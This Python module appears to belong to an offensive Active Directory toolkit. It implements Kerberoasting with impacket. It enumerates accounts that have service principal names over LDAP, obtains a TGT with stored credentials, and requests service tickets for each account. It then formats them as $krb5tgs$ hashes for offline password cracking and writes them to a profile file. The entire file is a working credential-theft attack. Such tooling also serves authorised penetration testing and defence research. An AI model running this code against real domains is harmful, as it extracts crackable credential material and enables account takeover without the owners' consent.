from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import compute_lmhash, compute_nthash
from binascii import hexlify
from impacket.krb5.asn1 import TGS_REP
from pyasn1.codec.der import decoder
from rich.console import Console
console = Console()

from handlers.smb_connection import SMBConnectionManager
from handlers.ldap_connection import LdapHandler
from handlers.profile.get_data import get_domain, get_username, get_password
from handlers.profile.helper import get_current_profile_path

from uuid import uuid4
random_uuid = uuid4().hex

class Kerberoasting:
    name = "kerberoasting"
    desc = "Search for kerberoasting computers and users"
    module_protocol = ['smb', 'ldap']
    opsec_safe = True
    multiple_hosts = False
    requires_args = True
    min_args = 1
    search_filter = '(&(servicePrincipalName=*)(!(objectCategory=computer)))'
    attributes = ['servicePrincipalName', 'sAMAccountName']

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self):
        pass

    def get_machine_name(self, dc_ip) -> None:
        ''' Get the machine name thorugh an SMBConnection + getServerName()'''

        smb_manager = SMBConnectionManager()
        smb_connection = smb_manager.get_smb_connection(dc_ip)
        machine_name = smb_connection.getServerName()

        return machine_name
    
    def get_kerberoastable_users(self, dc_ip) -> None:
        ''' Get all kerberoastable users through LDAP query '''
        conn, base_dn = LdapHandler.connection(self)
        results = conn.search(base_dn, self.search_filter, attributes=self.attributes)
        res_status = results[0]
        res_response = results[2]
        users_sam = []

        if res_status:
            for entry in res_response:
                if entry['type'] == 'searchResEntry':
                    attributes = entry.get('attributes', {})
                    spns_sam = attributes.get('sAMAccountName', [])
                    users_sam.append(spns_sam)

        return users_sam
    
    def get_dc_dnshostname(self) -> None:
        search_filter = '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        attributes = 'dnsHostname'

        conn, base_dn = LdapHandler.connection(self)

        if conn is None:
            console.print("[red][!][/] Failed to establish LDAP connection.")
            return []
        
        results = conn.search(base_dn, search_filter, attributes=attributes)
        res_response = results[2]
        dcs_list = []

        for entry in res_response:
            if entry['type'] == 'searchResEntry':
                hostname = entry['attributes'][attributes]
                dcs_list.append(hostname)

        return dcs_list
    
    def kerberoasting(self, username, password, domain):
        user_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        lmhash = compute_lmhash(password)
        nthash = compute_nthash(password)
        kdc_server = self.get_dc_dnshostname()[0] if self.get_dc_dnshostname() else None

        if not kdc_server:
            console.print("[red][!][/] No Domain Controller found.")
            return None

        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                user_name, "", domain, lmhash, nthash, "", kdcHost=kdc_server
            )

            return tgt, cipher, sessionKey, kdc_server
        except Exception as e:
            console.print(f"[red][!][/] Exception during TGT request: {str(e)}")
            return None

    @staticmethod
    def format_entry(etype, username, realm, spn, cipher_octets):
        spn = spn.replace(":", "~")
        if etype in [constants.EncryptionTypes.rc4_hmac.value, constants.EncryptionTypes.des_cbc_md5.value]:
            checksum = hexlify(cipher_octets[:16]).decode()
            data = hexlify(cipher_octets[16:]).decode()
        else:  # AES128 and AES256
            checksum = hexlify(cipher_octets[-12:]).decode()
            data = hexlify(cipher_octets[:-12]).decode()
        
        return f"$krb5tgs${etype}$*{username}${realm}${get_domain()}/{username}*${checksum}${data}"

    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
        decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = decoded_tgs["ticket"]["enc-part"]
        etype = enc_part["etype"]
        cipher_octets = enc_part["cipher"].asOctets()
        entry = Kerberoasting.format_entry(etype, username, decoded_tgs["ticket"]["realm"], spn, cipher_octets)

        return entry
    
    def save_output_tgs(self, tgs):
        path = get_current_profile_path() + '/' + f'{random_uuid}_kerberoasting.txt'

        try:
            with open(path, '+a') as kerberoasting_file:
                kerberoasting_file.write(f'{tgs}\n')

        except Exception as error:
            console.print(f"[red]![/] Error when writing TGS output to {path}: {error}")

    def on_login(self, con_input):
        if not con_input or len(con_input.split()) < 1:
            console.print("[red]Usage:[/] kerberoasting <target>")
            return
        
        console.print(f'\n[green][+][/] Target: {self.get_machine_name(con_input)}')
        kerberoastable_users = self.get_kerberoastable_users(con_input)

        if not kerberoastable_users:
            console.print(f'[red][!][/] No kerberoastable users found')
            return

        console.print(f'[green][+][/] Kerberoastable Users: {kerberoastable_users}')

        domain = get_domain()
        my_username = get_username()
        my_password = get_password()

        for user in kerberoastable_users:
            spn = user 
            tgt, cipher, sessionKey, kdc_server = self.kerberoasting(my_username, my_password, domain)

            if not tgt:
                console.print("[red][!][/] Unable to obtain TGT.")
                return

            spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
            
            try:
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                    spn_principal, domain, kdc_server, tgt, cipher, sessionKey
                )
    
                tgs_output = self.output_tgs(tgs, oldSessionKey, sessionKey, user, spn)
                console.print(f"[yellow]{tgs_output}[/]\n", highlight=False)
                self.save_output_tgs(tgs_output)

            except Exception as e:
                console.print(f"[red][!][/] Exception during TGS request for {spn}: {str(e)}")

        console.print(f"[green][+][/] Output saved to: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)